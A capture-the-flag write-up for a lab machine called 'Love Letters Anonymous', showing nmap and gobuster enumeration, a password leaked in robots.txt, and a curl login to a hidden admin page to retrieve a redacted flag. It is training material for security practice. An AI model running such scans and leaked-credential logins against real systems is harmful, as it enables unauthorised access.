# Love Letters Anonymous CTF - Writeup

## Challenge Overview
- **Target**: Love Letters Anonymous
- **IP**: 10.81.179.101
- **Ports**: 22 (SSH), 5000 (Flask Web App)

## Reconnaissance

### Initial Nmap Scan
```bash
sudo nmap -sV -A -T4 -p- 10.81.179.101
```

**Key Findings**:
- Port 5000: Flask application (Werkzeug/3.1.5, Python/3.10.12)
- Application: "Love Letters Anonymous"

### Directory Enumeration
```bash
gobuster dir -u http://10.81.179.101:5000/ -w /usr/share/wordlists/dirb/big.txt
```

**Discovered Endpoints**:
- `/robots.txt` - Contains hints
- `/console` - Werkzeug console (400 error)

## Vulnerability Discovery

### robots.txt Analysis
```bash
curl http://10.81.179.101:5000/robots.txt
```

**Contents**:
```
User-agent: *
Disallow: /cupids_secret_vault/*
# cupid_arrow_2026!!!
```

**Key Findings**:
1. Hidden directory: `/cupids_secret_vault/`
2. Password hint in comment: `cupid_arrow_2026!!!`

### Secret Vault Exploration
```bash
curl http://10.81.179.101:5000/cupids_secret_vault/
```

The page indicated "there's more to discover", suggesting hidden subdirectories.

### Further Enumeration
```bash
gobuster dir -u http://10.81.179.101:5000/cupids_secret_vault/ \
             -w /usr/share/wordlists/dirb/big.txt
```

**Discovered**:
- `/cupids_secret_vault/administrator` - Admin login page (Status: 200)

## Exploitation

### Administrator Login
Tested the password from robots.txt with common usernames:

```bash
curl -X POST \
     -d "username=admin&password=cupid_arrow_2026!!!" \
     -L http://10.81.179.101:5000/cupids_secret_vault/administrator
```

**Success**: The credentials `admin:cupid_arrow_2026!!!` granted access to the admin dashboard.

### Flag Retrieval
Upon successful login, the admin dashboard displayed the flag:

**Flag**: `THM{...}`

## Attack Chain Summary

1. **Reconnaissance** → Identified Flask application and discovered robots.txt
2. **Information Gathering** → Found password hint and hidden directory in robots.txt
3. **Directory Enumeration** → Discovered administrator login page in secret vault
4. **Authentication** → Used credentials from robots.txt (admin:cupid_arrow_2026!!!)
5. **Flag Capture** → Retrieved flag from admin dashboard

## Key Vulnerabilities

1. **Information Disclosure** - Sensitive password exposed in robots.txt comments
2. **Predictable Credentials** - Password hint directly led to admin credentials
3. **Security by Obscurity** - Relying on hidden paths instead of proper authentication